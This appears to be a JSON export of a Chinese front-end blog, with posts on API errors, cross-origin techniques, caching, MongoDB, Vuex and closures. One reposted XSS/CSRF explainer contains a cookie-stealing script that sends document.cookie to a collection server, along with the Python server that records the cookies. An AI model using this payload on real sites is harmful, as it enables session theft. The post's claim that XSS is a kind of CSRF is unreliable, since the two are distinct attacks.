API这个概念是我这几天看博客才接触到的，但其实在日常开发中这个思想始终都占据着重要地位。 简介随着移动开发和前端开发的崛起，越来越多的 Web 后端应用都倾向于实现 Restful API。Restful API 是一个简单易用的前后端分离方案，它只需要对客户端请求进行处理，然后返回结果即可， 无需考虑页面渲染，一定程度上减轻了后端开发人员的负担。不过，这也意味着，有一些工作就必须由前端来完成了，比如错误处理。 当 Restful API 需要抛出错误的时候，我们要考虑的是：这个错误应该包含哪些信息。我们先看看 Github, Google, Facebook, Twitter, Twilio 的错误信息是怎样的。 123456789101112131415161718192021222324252627282930313233343536373839//Github&#123; \"message\": \"Validation Failed\", \"errors\": [ &#123; \"resource\": \"Issue\", \"field\": \"title\", \"code\": \"missing_field\" &#125; ]&#125;//Google&#123; \"error\": &#123; \"errors\": [ &#123; \"domain\": \"global\", \"reason\": \"insufficientFilePermissions\", \"message\": \"The user does not have sufficient permissions for file &#123;fileId&#125;.\" &#125; ], \"code\": 403, \"message\": \"The user does not have sufficient permissions for file &#123;fileId&#125;.\" &#125;&#125;//Facebook&#123; \"error\": &#123; \"message\": \"Message describing the error\", \"type\": \"OAuthException\", \"code\": 190, \"error_subcode\": 460, \"error_user_title\": \"A title\", \"error_user_msg\": \"A message\", \"fbtrace_id\": \"EJplcsCHuLu\" &#125;&#125; 观察这些结构可以发现它们都有一些共同的地方： 都利用了 Http 状态码 有些返回了业务错误码 都提供了给用户看的错误提示信息 有些提供了给开发者看的错误信息 设计错误类型我们刚才提到过，可以利用 Http 状态码来为错误类型进行分类。通常我们所说的分类通常是对客户端错误进行分类， 即 4xx 类型的错误。 而这些错误类型中，我们最常用的是： 400 Bad Request由于包含语法错误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。通常在请求参数不合法或格式错误的时候可以返回这个状态码。 401 Unauthorized当前请求需要用户验证。通常在没有登录的状态下访问一些受保护的 API 时会用到这个状态码。 403 Forbidden服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助。通常在没有权限操作资源时(如修改/删除一个不属于该用户的资源时)会用到这个状态码。 404 Not Found请求失败，请求所希望得到的资源未被在服务器上发现。通常在找不到资源时返回这个状态码。 我个人习惯把错误分成以下几种类型： 格式错误 (FORMAT_INVALID) 数据不存在 (DATA_NOT_FOUND) 数据已存在 (DATA_EXISTED) 数据无效 (DATA_INVALID) 登录错误 (LOGIN_REQUIRED) 权限不足 (PERMISSION_DENIED) 错误分类之后，我们抛错误的时候就变得更加直观了：123456789101112if (!res.body.title) &#123; throw new Error(ERROR.FORMAT_INVALID)&#125;if (!user) &#123; throw new Error(ERROR.LOGIN_REQUIRED)&#125;if (!post) &#123; throw new Error(ERROR.DATA_NOT_FOUND)&#125;if (post.creator.id !== user.id) &#123; throw new Error(ERROR.PERMISSION_DENIED)&#125;","tags":[{"name":"后端","slug":"后端","permalink":"https://ganchengyuan1990.github.io/blog/tags/后端/"}]},{"title":"ZT-跨域问题整理","date":"2017-01-23T01:22:43.000Z","path":"2017/01/23/跨域问题整理/","text":"跨域，是一个前端开发者必须掌握的概念，这篇文章就从几个基本问题出发，来理解这个概念。 首先，什么是跨域？为何会有跨域？跨域一词从字面意思看，就是跨域名嘛，但实际上跨域的范围绝对不止那么狭隘。具体概念如下：只要协议、域名、端口有任何一个不同，都被当作是不同的域。所以说，如果你的后端用的是NODEJS，然后端口设置采用了默认的3000，还是会产生跨域的。之所以会产生跨域这个问题呢，其实也很容易想明白，要是随便引用外部文件，不同标签下的页面引用类似的彼此的文件，浏览器很容易懵逼的，安全也得不到保障了就。什么事，都是安全第一嘛。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。所以我们要通过一些方法使本域的js能够操作其他域的页面对象或者使其他域的js能操作本域的页面对象（iframe之间）。下面是具体的跨域情况详解： 123456789101112131415161718URL //说明 是否允许通信http://www.a.com/a.jshttp://www.a.com/b.js //同一域名下 允许http://www.a.com/lab/a.jshttp://www.a.com/script/b.js //同一域名下不同文件夹 允许http://www.a.com:8000/a.jshttp://www.a.com/b.js //同一域名，不同端口 不允许http://www.a.com/a.jshttps://www.a.com/b.js //同一域名，不同协议 不允许http://www.a.com/a.jshttp://70.32.92.74/b.js //域名和域名对应ip 不允许http://www.a.com/a.jshttp://script.a.com/b.js //主域相同，子域不同 不允许（cookie这种情况下也不允许访问）http://www.a.com/a.jshttp://a.com/b.js //同一域名，不同二级域名（同上） 不允许（cookie这种情况下也不允许访问）http://www.cnblogs.com/a.jshttp://www.a.com/b.js //不同域名 不允许 那么跨域方法有哪些呢？既然有跨域这种限制，我们要怎么绕过它呢？ 1. 通过document.domain跨域前面说过了，浏览器有一个同源策略，其限制之一是不能通过ajax的方法去请求不同源中的文档。 第二个限制是浏览器中不同域的框架之间是不能进行js的交互操作的。不同的框架之间是可以获取window对象的，但却无法获取相应的属性和方法。比如，有一个页面，它的地址是http://www.damonare.cn/a.html ， 在这个页面里面有一个iframe，它的src是http://damonare.cn/b.html, 很显然，这个页面与它里面的iframe框架是不同域的，所以我们是无法通过在页面中书写js代码来获取iframe中的东西的： 123456789&lt;script type=\"text/javascript\"&gt; function test()&#123; var iframe = document.getElementById('iframe'); var win = iframe.contentWindow;//可以获取到iframe里的window对象，但该window对象的属性和方法几乎是不可用的 var doc = win.document;//这里获取不到iframe里的document对象 var name = win.name;//这里同样获取不到window对象的name属性 &#125;&lt;/script&gt;&lt;iframe id = \"iframe\" src=\"http://damonare.cn/b.html\" onload = \"test()\"&gt;&lt;/iframe&gt; 这个时候，document.domain就可以派上用场了，我们只要把http://www.damonare.cn/a.html和http://damonare.cn/b.html这两个页面的document.domain都设成相同的域名就可以了。但要注意的是，document.domain的设置是有限制的，我们只能把document.domain设置成自身或更高一级的父域，且主域必须相同。 在页面http://www.damonare.cn/a.html 中设置document.domain: 1234567&lt;iframe id = \"iframe\" src=\"http://damonare.cn/b.html\" onload = \"test()\"&gt;&lt;/iframe&gt;&lt;script type=\"text/javascript\"&gt; document.domain = 'damonare.cn';//设置成主域 function test()&#123; alert(document.getElementById('￼iframe').contentWindow);//contentWindow 可取得子窗口的 window 对象 &#125;&lt;/script&gt; 在页面http://damonare.cn/b.html 中也设置document.domain: 123&lt;script type=\"text/javascript\"&gt; document.domain = 'damonare.cn';//在iframe载入这个页面也设置document.domain，使之与主页面的document.domain相同&lt;/script&gt; 修改document.domain的方法只适用于不同子域的框架间的交互。 2. 通过location.hash跨域因为父窗口可以对iframe进行URL读写，iframe也可以读写父窗口的URL，URL有一部分被称为hash，就是#号及其后面的字符，它一般用于浏览器锚点定位，Server端并不关心这部分，应该说HTTP请求过程中不会携带hash，所以这部分的修改不会产生HTTP请求，但是会产生浏览器历史记录。此方法的原理就是改变URL的hash部分来进行双向通信。每个window通过改变其他 window的location来发送消息（由于两个页面不在同一个域下IE、Chrome不允许修改parent.location.hash的值，所以要借助于父窗口域名下的一个代理iframe），并通过监听自己的URL的变化来接收消息。这个方式的通信会造成一些不必要的浏览器历史记录，而且有些浏览器不支持onhashchange事件，需要轮询来获知URL的改变，最后，这样做也存在缺点，诸如数据直接暴露在了url中，数据容量和类型都有限等。下面举例说明： 假如父页面是baidu.com/a.html,iframe嵌入的页面为google.cob.html（此处省略了域名等url属性），要实现此两个页面间的通信可以通过以下方法。 a.html传送数据到b.html a.html下修改iframe的src为google.com/b.html#paco b.html监听到url发生变化，触发相应操作 b.html传送数据到a.html，由于两个页面不在同一个域下IE、Chrome不允许修改parent.location.hash的值，所以要借助于父窗口域名下的一个代理iframe b.html下创建一个隐藏的iframe，此iframe的src是baidu.com域下的，并挂上要传送的hash数据，如src=”http://www.baidu.com/proxy.html#data“ proxy.html监听到url发生变化，修改a.html的url（因为a.html和proxy.html同域，所以proxy.html可修改a.html的url hash）** a.html监听到url发生变化，触发相应操作 b.html关键代码是123456789try &#123; parent.location.hash = 'data'; &#125; catch (e) &#123; // ie、chrome的安全机制无法修改parent.location.hash， var ifrproxy = document.createElement('iframe'); ifrproxy.style.display = 'none'; ifrproxy.src = \"http://www.baidu.com/proxy.html#data\"; document.body.appendChild(ifrproxy); &#125; 总的来说，这两个方法都是非常hacky的，所以目前来说广泛应用的场景非常少。重点是下面三种方式 3. 通过HTML5的postMessage方法跨域高级浏览器Internet Explorer 8+, chrome，Firefox , Opera 和 Safari 都将支持这个功能。这个功能主要包括接受信息的”message”事件和发送消息的”postMessage”方法。比如damonare.cn域的A页面通过iframe嵌入了一个google.com域的B页面，可以通过以下方法实现A和B的通信。 A页面通过postMessage方法发送消息： 12345window.onload = function() &#123; var ifr = document.getElementById('ifr'); var targetOrigin = \"http://www.google.com\"; ifr.contentWindow.postMessage('hello world!', targetOrigin); &#125;; B页面通过message事件监听并接受消息: 1234567891011121314var onmessage = function (event) &#123; var data = event.data;//消息 var origin = event.origin;//消息来源地址 var source = event.source;//源Window对象 if(origin==\"http://www.baidu.com\")&#123; console.log(data);//hello world! &#125; &#125;; if (typeof window.addEventListener != 'undefined') &#123; window.addEventListener('message', onmessage, false); &#125; else if (typeof window.attachEvent != 'undefined') &#123; //for ie window.attachEvent('onmessage', onmessage); &#125; 此方案也得建立一个隐藏的iframe，并且H5的兼容性也是一个问题，移动端可以尝试。 4. JSONP方法跨域刚才说的这几种都是双向通信的，即两个iframe，页面与iframe或是页面与页面之间的，下面说几种单项跨域的（一般用来获取数据），因为通过script标签引入的js是不受同源策略的限制的。所以我们可以通过script标签引入一个js或者是一个其他后缀形式（如php，jsp等）的文件，此文件返回一个js函数的调用。比如，有个a.html页面，它里面的代码需要利用ajax获取一个不同域上的json数据，假设这个json数据地址是http://damonare.cn/data.php,那么a.html中的代码就可以这样： 12345&lt;?php$callback = $_GET['callback'];//得到回调函数名$data = array('a','b','c');//要返回的数据echo $callback.'('.json_encode($data).')';//输出?&gt; jquery会自动生成一个全局函数来替换callback=?中的问号，之后获取到数据后又会自动销毁，实际上就是起一个临时代理函数的作用。$.getJSON方法会自动判断是否跨域，不跨域的话，就调用普通的ajax方法；跨域的话，则会以异步加载js文件的形式来调用jsonp的回调函数。 JSONP的优缺点: JSONP的优点是：它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。 JSONP的缺点则是：它只支持GET请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。 5. 通过CORS跨域CORS（Cross-Origin Resource Sharing）跨域资源共享，定义了必须在访问跨域资源时，浏览器与服务器应该如何沟通。CORS背后的基本思想就是使用自定义的HTTP头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功还是失败。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 一言不合上代码： 12345&lt;script type=\"text/javascript\"&gt; var xhr = new XMLHttpRequest(); xhr.open(\"￼GET\", \"http://segmentfault.com/u/trigkit4/\",true); xhr.send();&lt;/script&gt; 服务器端对于CORS的支持，主要就是通过设置Access-Control-Allow-Origin来实现的。如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。 相比于JSON，它有以下特点： JSONP只能实现GET请求，而CORS支持所有类型的HTTP请求。 使用CORS，开发者可以使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理。 JSONP主要被老的浏览器支持，它们往往不支持CORS，而绝大多数现代浏览器都已经支持了CORS）。 CORS更类似于一个高级的协议，只要服务器端和客户端都遵照这个协议来，就可以进行通信。 这个方案的主要工作量在于服务器端的配置，浏览器不需要任何额外工作。 在PHP文件中设置(亲测有效)： 123&lt;?php header(\"Access-Control-Allow-Origin:*\"); ?&gt; NodeJs配置(亲测有效)： 123456//To allow cross origin requestapp.use(function(req, res, next) &#123; res.header('Access-Control-Allow-Origin', '*'); res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept'); next();&#125;);","tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ganchengyuan1990.github.io/blog/tags/Javascript/"}]},{"title":"ZT-localStorage缓存机制","date":"2017-01-22T01:26:17.000Z","path":"2017/01/22/localStorage缓存机制/","text":"首先，localStorage的确是可以做JS以及CSS缓存的，详情可以通过F12看http://mp.weixin.qq.com/s?__biz=MzA5NDIzNzY1OQ==&amp;mid=2735610010&amp;idx=1&amp;sn=67e3f0833f1097a279d850e2098956ff&amp;scene=0#wechat_redirect 按道理说这个机制是非常诱人的，毕竟localStorage可存储体积大，并且用户一旦开启便不容易清除，所以从工程师的角度来看这个工具非常适合缓存一些并不经常需要维护更新的脚本和样式文件。 当然，假如要更新的话，就得好好设计一下更新机制，普通的资源请求，可以根据文件名+md5 http://res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/moon32ebc4.js或者在资源链接后面加上特定的后缀http://1.ss.faisys.com/js/comm/fai.min.js?v=201612051739做标识来判断是否需要更新资源。如果用localStorage做，则需要一套新的缓存更新机制。 微信的做法是每个文件都单独维护一个localStorage变量，来记录版本号，从而由后台来判断是否需要更新。 此方案的优点对于传统的浏览器缓存（如COOKIE）, 用户主动触发的页面刷新行为（比如刷新按钮、右键刷新、F5等），会导致浏览器放弃本地缓存，使用协商缓存（304缓存），用了LS之后，可以完全避免这种情况，等效于无视用户主动刷新行为的本地强缓存。当LS+eval速度大于304协商速度时，LS方案具有统计上的正收益。 还有，缓存问题也绝不是一个页面的问题，网站很多页面之间会跳转访问，彼此之间也有共享的静态资源，基于url的缓存让跨页面之间缓存共享问题变得粗粒度。举个例子，有A、B两个页面，彼此有访问路径（比如百度首页和搜索结果页之间的访问），其中： A页面使用资源：a, b, c, d B页面使用资源：a, b, c, e, f 假设不考虑并发请求的优化，我们希望尽可能的打包，再假设A页面是主要入口，那么，最合理的方案可能就是a-b-c-d打包（设为[abcd]），e-f打包（设为[ef]），从而使得： A页面使用url：[abcd] B页面使用url：[abcd]+[ef] 由于用户大多首次访问A页面，然后会跳转到B页面，所以访问A页面会很快，再跳转到B页面可以从缓存中使用[abcd]包，再只需加载[ef]包即可。为了更大的缓存利用率，我们让B页面复用A页面的url缓存，但多了一个不需要的d资源这也是合理的。也就是说，基于url的缓存利用可能在有些情况下会资源的冗余加载。想想那些通过url直接访问B页面的用户来说，无缓存情况下，页面加载的是[abcd]+[ef]两个资源包，既有冗余，又是两个请求，这并不是最理想的加载策略（这个方案是倾向于优化A页面展现的，虽然B页面首次展现不理想，但B页面大部分pv是从A页面导入，网站总体性能是更好的）。 而使用combo服务+LS的情况就不同了，假设combo的url的形式是[a,b,c,…]，那么单独访问A、B页面的资源url就是： A页面使用url：[a,b,c,d] B页面使用url：[a,b,d,e,f]用户由A页面进入网站，加载[a,b,c,d]这个url，然后LS缓存4个资源，再跳转到B页面，缓存控制框架可以知道本地缓存了哪些，然后只发起[e,f]这个请求。其效果基本等效于浏览器基于URL的缓存。而对于那些没有通过A页面直接访问B页面的用户来说，B页面加载的是[a,b,d,e,f]，也是不错的合并策略。LS在这个时候就发挥了那么一点点优势。 当然，这种优势还不够明显，最能展现LS优势的，其实是单页面应用。因为单页面应用需要完全有JS管理页面状态，并增量加载资源，用户也可能通过带有hash的url直接访问某个单页面中的虚拟页面，同一个页面会有很多种不同的资源请求组合，这个时候，唯有LS+combo才能很好的解决资源加载与缓存问题。对于这种情况，我有一个网站可以用于展示效果： Scrat - webapp模块化开发体系http://scrat.io/#!/index 方案存在的问题首先，对SEO是不友好的。要进行SEO，必须直接输出完整HTML，因此必须让样式在头部以link标签加载。如果先输出HTML，后用js从本地缓存读取样式再插入，会出现严重的阻塞和闪烁问题，相信正常人是不会这么干的。 兼容性不太好，不支持LS的浏览器比例仍然很大。 在未来，HTTP2时代的到来应该会完美绝杀这种黑科技，因此，工程化的具体实施方法必然要与时俱进，不过工程化的方法论不会过时，无论在哪个时代，我们都应该全面、科学的分析工程问题，结合当前的浏览器环境和技术手段来做方案，保持网站的性能。 其次，引入localStorage中的缓存文件不像标签插入JS那样可以自执行，因此需要一些技巧，常见的方法是写eval()函数，把所有的代码都执行出来，但是这有一个问题，就是不便于压缩。因此也可以用另一个方法： 1234var script = document.createElement('script');var code = '!function()&#123;' + getCodeFromLocalStorage() + '\\n&#125;();';script.appendChild(document.createTextNode(code));document.head.appendChild(script); 容易出现安全问题，一旦有xss漏洞就会被人利用，将恶意代码注入到LS中导致即便修复了xss恶意代码也存在的问题。所以我们现在采用的策略是每次部署新版本就会清除全部缓存。这会导致缓存利用率的下降，不过至少还有部分浏览器缓存在呢，算是一个折中处理。","tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ganchengyuan1990.github.io/blog/tags/Javascript/"}]},{"title":"初识mongodb","date":"2017-01-20T01:14:53.000Z","path":"2017/01/20/初识mongodb/","text":"mongodb传说中的非关系数据库，颠覆了我们在大学时学数据库时的三观，虽说那时并非所有的数据库都是关系型数据库，但起码有一统江湖的感觉。 引入1npm i mongo 另外，还有一个非常重要的步骤，要在命令行中执行 mongod –dbpath “D:\\vue\\vue-wechat\\server” D:\\vue\\vue-wechat\\server换成需要启动服务的位置，也就是你项目的server文件夹。这个命令相当于打开MONGODB的服务界面，让其进入服务状态。 server JS维护```javascriptconst mongodb = require(‘mongodb’);const server = new mongodb.Server(‘localhost’, 27017, {auto_reconnect:true});var db = new mongodb.Db(‘XXXX’, server, {safe:true}); //XXXX可以改成任意名字 const hostname = ‘127.0.0.1’;const port = 9001; //port注意不要和已启动的服务端口重合，比如PHP常用的9000，VUE常用的8080 http.createServer((req, res) =&gt; { var json; var _callbackName = req.url.substr(req.url.indexOf(‘=’) + 1); http.get(‘XXXXXXXX’, (response) =&gt; { response.setEncoding(‘utf8’); response.on(‘data’, (data) =&gt; { // json = data; res.end(_callbackName + “(“ + data + “)”); res._tempData = data; db.open( (err, db) =&gt;{ if (!err) { console.log(&apos;connect db&apos;); //数据库连接 db.createCollection(&apos;test&apos;, { safe: true }, (err, collection) =&gt; { debugger if (err) { console.log(err); } else { var tmp1 = JSON.parse(res._tempData); collection.insert([tmp1], { safe: true }, function(err, result) { console.log(result); }); /*collection.remove({title: &quot;world&quot;}, function(err, count) { // console.log(count); })*/ collection.find().toArray(function(err, docs) { console.log(&apos;find&apos;); console.log(docs); }); db.close(); /*collection.findOne(function(err, doc) { console.log(&apos;findOne&apos;); console.log(doc); });*/ } }); } else { console.log(err); } }); }); });}).listen(port, hostname, () =&gt; { console.log(Server running at http://${hostname}:${port}/);}); 总结一下，总的来说非常简单，不知效率如何，我的猜想，应该是比较适合层次较少的JSON数据结构。","tags":[{"name":"后端","slug":"后端","permalink":"https://ganchengyuan1990.github.io/blog/tags/后端/"}]},{"title":"ZT- Js载入defer和async方式的区别","date":"2017-01-19T06:06:49.000Z","path":"2017/01/19/Js-载入defer和async方式的区别/","text":"async加载完便执行，乱序的；defer会等到html解析完再执行，并且是顺序的。 defer 和 async 在网络读取（下载）这块儿是一样的，都是异步的（相较于 HTML 解析） 它俩的差别在于脚本下载完之后何时执行，显然 defer 是最接近我们对于应用脚本加载和执行的要求的 关于 defer，此图未尽之处在于它是按照加载顺序执行脚本的，这一点要善加利用 async 则是一个乱序执行的主，反正对它来说脚本的加载和执行是紧紧挨着的，所以不管你声明的顺序如何，只要它加载完了就会立刻执行 仔细想想，async 对于应用脚本的用处不大，因为它完全不考虑依赖（哪怕是最低级的顺序执行），不过它对于那些可以不依赖任何脚本或不被任何脚本依赖的脚本来说却是非常合适的，最典型的例子：Google Analytics","tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ganchengyuan1990.github.io/blog/tags/Javascript/"}]},{"title":"ZT-XSS和CSRF对比","date":"2017-01-19T01:11:30.000Z","path":"2017/01/19/XSS和CSRF对比/","text":"转载：https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/ XSS：脚本中的不速之客XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。 运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：123while (true) &#123; alert(\"你关不掉我~\");&#125; 也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器： 12345678910111213141516171819202122232425262728#!/usr/bin/env python#-*- coding:utf-8 -*-\"\"\"&lt;!-- more --&gt;跨站脚本注入的信息收集服务器\"\"\"javascriptimport bottleapp = bottle.Bottle()plugin = bottle.ext.sqlite.Plugin(dbfile='/var/db/myxss.sqlite')app.install(plugin)@app.route('/myxss/')def show(cookies, db): SQL = 'INSERT INTO \"myxss\" (\"cookies\") VALUES (?)' try: db.execute(SQL, cookies) except: pass return \"\"if __name__ == \"__main__\": app.run() 然后在某一个页面的评论中注入这段代码：12345678910111213141516// 用 &lt;script type=\"text/javascript\"&gt;&lt;/script&gt; 包起来放在评论中(function(window, document) &#123; // 构造泄露信息用的 URL var cookies = document.cookie; var xssURIBase = \"http://192.168.123.123/myxss/\"; var xssURI = xssURIBase + window.encodeURI(cookies); // 建立隐藏 iframe 用于通讯 var hideFrame = document.createElement(\"iframe\"); hideFrame.height = 0; hideFrame.width = 0; hideFrame.style.display = \"none\"; hideFrame.src = xssURI; // 开工 document.body.appendChild(hideFrame);&#125;)(window, document); 个人总结：XSS是CSRF中的一种，是特指通过执行JS脚本来进行的攻击。CSRF则方式更多，比如通过代码中的逻辑问题去进行攻击，黑客通过伪装成用户进行攻击。","tags":[{"name":"网络相关","slug":"网络相关","permalink":"https://ganchengyuan1990.github.io/blog/tags/网络相关/"}]},{"title":"html render & paint（重排和重绘）","date":"2017-01-18T03:05:38.000Z","path":"2017/01/18/html-render-paint/","text":"首先，先吐槽一下weex学习社区的内容真的非常不全面，自学很难，优点是调试相对简单，暂时放一放，以后有空再看看。 接下来进入正题，讲一讲昨天刚复习的有关浏览器页面渲染的知识点。 ##repaint、reflow/relayout、restyle 这四个概念分别代表什么？先来看一张图，了解一下浏览器页面的渲染过程 这里要注意的是：要生成Dom Tree和Css Tree以后才会生成render tree，然后进行绘制(paint)。1. 首先，浏览器解析HTML源码构建DOM树，在DOM树中，每个HTML标签都有对应的节点，并且在介于两个标签中间的文字块也对应一个text节点。DOM树的根节点是documentElement，也就是标签；2. 然后，浏览器对CSS代码进行解析，一些当前浏览器不能识别的CSS hack写法（如-moz-/-webkit等前缀，以及IE下的/_等）将会被忽略。CSS样式的优先级如下：最低的是浏览器的默认样式，然后是通过、import引入的外部样式和行内样式，最高级的是直接写在标签的style属性中的样式；3. 随后将进入非常有趣的环节-构建渲染树。渲染树跟DOM树结构相似但并不完全匹配。渲染树会识别样式，所以如果通过设置display:none隐藏的标签是不会被渲染树引入的。同样的规则适用于标签以及其包含的所有内容。另外，在渲染树中可能存在多个渲染节点（渲染树中的节点称为渲染节点）映射为一个DOM标签，例如，多行文字的标签中的每一行文字都会被视为一个单独的渲染节点。渲染树的一个节点也称为frame-结构体，或者盒子-box（与CSS盒子类似）。每个渲染节点都具有CSS盒子的属性，如width、height、border、margin等；4. 最后，等待渲染树构建完毕后，浏览器便开始将渲染节点一一绘制-paint到屏幕上。。OK，接下来看一个例子1234567891011121314151617181920&lt;html&gt;&lt;head&gt; &lt;title&gt;Beautiful page&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt; Once upon a time there was a looong paragraph... &lt;/p&gt; &lt;div style=\"display: none\"&gt; Secret message &lt;/div&gt; &lt;div&gt;&lt;img src=\"...\" /&gt;&lt;/div&gt; ... &lt;/body&gt;&lt;/html&gt;这个html对应的DOM结构如下：1234567891011121314documentElement (html) head title body p [text node] div [text node] div img ...由于渲染树会忽略head内容和隐藏的节点，并且会将中的多行文字按行数映射为单独的渲染节点，故构建完成的渲染树结构如下：123456789101112root (RenderView) body p line 1 line 2 line 3 ... div img ...## 重绘-repaint和回流（重排）-reflow同一时间内至少存在一个页面初始化layout行为和一个绘制行为（除非你的页面是空白页-blank）。在此之后，改变任何影响构造渲染树的行为都会触发以下一种或者多种动作：1. 渲染树的部分或者全部将需要重新构造并且渲染节点的大小需要重新计算。这个过程叫做回流-reflow，或者layout，或者layouting（靠，能不能愉快的翻译了，是不是还来个过去式啊?!），或者relayout（这词是原文作者杜撰的，为了标题中多个“R”）。浏览器中至少存在一个reflow行为-即页面的初始化layout；2. 屏幕的部分区域需要进行更新，要么是因为节点的几何结构改变，要么是因为格式改变，如背景色的变化。屏幕的更新行为称作重绘-repaint，或者redraw。## 如何减少重绘和回流减少因为重绘和回流引起的糟糕用户体验的本质是尽量减少重绘和回流，减少样式信息的set行为。可以通过以下几点来优化：1. 不要逐个修改多个样式。对于静态样式来说，最明智和易维护的代码是通过改变classname来控制样式；而对于动态样式来说，通过一次修改节点的cssText来代替样式的逐个改变。2. “离线”处理多个DOM操作。“离线”的意思是将需要进行的DOM操作脱离DOM树，比如： 通过documentFragment集中处理临时操作； 将需要更新的节点克隆，在克隆节点上进行更新操作，然后把原始节点替换为克隆节点；* 先通过设置display:none将节点隐藏（此时出发一次回流和重绘），然后对隐藏的节点进行100个操作（这些操作都会单独触发回流和重绘），完毕后将节点的display改回原值（此时再次触发一次回流和重绘）。通过这种方法，将100次回流和重绘缩减为2次，大大减少了消耗3. 不要过多进行重复的样式计算操作。如果你需要重复利用一个静态样式值，可以只计算一次，用一个局部变量储存，然后利用这个局部变量进行相关操作。4. 总之，当你在打算改变样式时，首先考虑一下渲染树的机制，并且评估一下你的操作会引发多少刷新渲染树的行为。例如，我们知道一个绝对定位的节点是会脱离文档流，所以当对此节点应用动画时不会对其他节点产生很大影响，当绝对定位的节点置于其他节点上层时，其他节点只会触发重绘，而不会触发回流。## restyle到底是什么？仔细的朋友会发现，到现在我们也没具体说restyle的情况，restyle指的是没有几何结构改变的渲染树变化。也就是说restyle和reflow是一个层次的概念，完成以后都会引发repaint! 总结一下重新计算渲染树的行为被Mozilla称为回流-reflow，被其他浏览器称为layout；将重新计算后的渲染树更新到屏幕的行为叫做重绘-repaint，或者redraw（in IE/DynaTrace）；","tags":[{"name":"css","slug":"css","permalink":"https://ganchengyuan1990.github.io/blog/tags/css/"}]},{"title":"vuex初探","date":"2017-01-17T02:27:29.000Z","path":"2017/01/17/vuex初探/","text":"Vuex的作用是什么Vuex主要用来进行状态管理，我的理解就是当你的VUE项目大到一定程度以后，需要一个帮手来帮助你进行组件管理，尤其是多层次的组件进行信息交互时，如果没有这样一个工具，就得维护公共变量或者一层一层传递参数，这个过程是非常令人不愉悦的。 引入12345import Vuex from 'vuex';import * as actions from './actions'; //改变状态都得通过这里的方法import * as getters from './getters'; //获取状态值的方法 store对象这个对象就是Vuex创建的实例对象，是重点需要学习的内容。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const store = &#123; //state对象维护具体状态值 state: &#123; isInitData: true, //首次刷新页面 &#125;, /** * vuex 2.0 action should be await Vuex规定每个状态值的改变最后都要通过actions函数来操作，并且规定必须是异步，因此调取接口的操作应该都在这里 */ actions: &#123; fetchSearchDataAction: (&#123; commit, dispatch &#125;, options) =&gt; &#123; commit('SET_TOP_LOADING', &#123; type: true &#125;) &#125;, &#125;, /** * even vuex 2.0 mutations should be async actions 只是一个架构性的概念，并不是必须的，说到底只是一个函数，你在里面想干嘛都可以，只要最后触发 mutation 就行。 */ mutations: &#123; [types.COMBINE_DETAIL_LIST](state, res) &#123; let cloneMerchandiseList = []; state.merchandiseList.forEach(item =&gt; &#123; cloneMerchandiseList.push(Object.assign(&#123;&#125;, item, res[item.sm_seq])); &#125;) //combine 合并基础对象和详细属性,重现渲染列表 state.merchandiseList = cloneMerchandiseList; &#125; &#125;, getters: &#123; listDownType: (state) =&gt; &#123; let type = '' state.selectListData.filter(item =&gt; &#123; if(item.isSelect)&#123; type = item.sortType &#125; &#125;) return type &#125; &#125;&#125; 注：同步的意义在于这样每一个 mutation 执行完成后都可以对应到一个新的状态（和 reducer 一样），这样 devtools 就可以打个 snapshot 存下来，然后就可以随便 time-travel 了。","tags":[{"name":"Vue","slug":"Vue","permalink":"https://ganchengyuan1990.github.io/blog/tags/Vue/"},{"name":"Javascript","slug":"Javascript","permalink":"https://ganchengyuan1990.github.io/blog/tags/Javascript/"}]},{"title":"javascript闭包个人理解","date":"2017-01-17T00:56:37.000Z","path":"2017/01/17/javascript闭包个人理解/","text":"个人理解，闭包的目的就是为了从外部读取内部函数的局部参数而设置的桥梁方法。 12345678910111213141516171819202122232425function closure() &#123; var n = 1; nAdd=function()&#123;n+=1; &#125; function inner()&#123; alert(n) &#125; return inner;&#125;var result = closure();result();nAdd();result(); // 1000var name = \"The Window\"; var object = &#123; name : \"My Object\", getNameFunc : function()&#123; return function()&#123; return this.name; &#125;; &#125; &#125;;alert(object.getNameFunc()());","tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ganchengyuan1990.github.io/blog/tags/Javascript/"}]},{"title":"Vue个人网站搭建","date":"2017-01-16T09:13:04.353Z","path":"2017/01/16/第一篇/","text":"自学Vue也有将近一个月了，想做个简单的小作品，正好这段时间自己的阿里云服务器闲置着，而且个人域名一直缺一个主页面，自然就想到做一个小项目来改装一下门庭。 ###手机预览(website) 废话不多说，上预览，http://www.jasongan.cn 安装install dependenciesnpm install serve with hot reload at localhost:8080npm run dev build for production with minificationnpm run build ``` 技术栈 vue-wechat是主要在利用Vue.js。 